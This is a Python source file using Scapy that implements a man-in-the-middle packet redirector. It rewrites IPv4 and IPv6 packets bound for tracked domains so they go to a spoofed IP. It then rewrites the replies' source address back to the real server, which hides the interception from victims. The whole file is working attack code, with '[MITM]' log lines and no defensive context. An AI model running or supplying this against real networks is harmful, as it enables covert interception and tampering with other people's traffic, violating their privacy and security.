from scapy.all import IP, TCP, UDP, send
from scapy.layers.inet6 import IPv6

class DomainRedirectFilter:
    def __init__(self, domain_tracker, spoof_ip, spoof_ipv6, logger=None):
        self.domain_tracker = domain_tracker
        self.spoof_ip = spoof_ip
        self.spoof_ipv6 = spoof_ipv6
        self.logger = logger

        # flow tracking: (client_ip, client_port, proto) → server_ip
        self.flows = {}

    def log(self, msg):
        if self.logger:
            self.logger(msg)
        else:
            print(msg)

    def __call__(self, pkt):
        # ──────────────── IPv4 ────────────────
        if pkt.haslayer(IP):
            ip = pkt[IP]

            # CLIENT → SERVER
            if ip.dst in self.domain_tracker.ips_v4:
                key = (ip.src, pkt.sport if pkt.haslayer(TCP) else None)
                self.flows[key] = ip.dst

                new = pkt.copy()
                new[IP].dst = self.spoof_ip

                del new[IP].chksum
                if pkt.haslayer(TCP):
                    del new[TCP].chksum
                if pkt.haslayer(UDP):
                    del new[UDP].chksum

                send(new, verbose=False)
                self.log(f"[MITM] Redirect IPv4 → {self.spoof_ip}")
                return True

            # SERVER → CLIENT
            if ip.src == self.spoof_ip:
                key = (ip.dst, pkt.dport if pkt.haslayer(TCP) else None)
                if key not in self.flows:
                    return False

                real_ip = self.flows[key]

                new = pkt.copy()
                new[IP].src = real_ip

                del new[IP].chksum
                if pkt.haslayer(TCP):
                    del new[TCP].chksum
                if pkt.haslayer(UDP):
                    del new[UDP].chksum

                send(new, verbose=False)
                self.log(f"[MITM] Restore IPv4 src {real_ip}")
                return True

        # ──────────────── IPv6 ────────────────
        if pkt.haslayer(IPv6):
            ip6 = pkt[IPv6]

            if ip6.dst in self.domain_tracker.ips_v6:
                new = pkt.copy()
                new[IPv6].dst = self.spoof_ipv6
                send(new, verbose=False)
                return True

            if ip6.src == self.spoof_ipv6:
                new = pkt.copy()
                new[IPv6].src = list(self.domain_tracker.ips_v6)[0]
                send(new, verbose=False)
                return True

        return False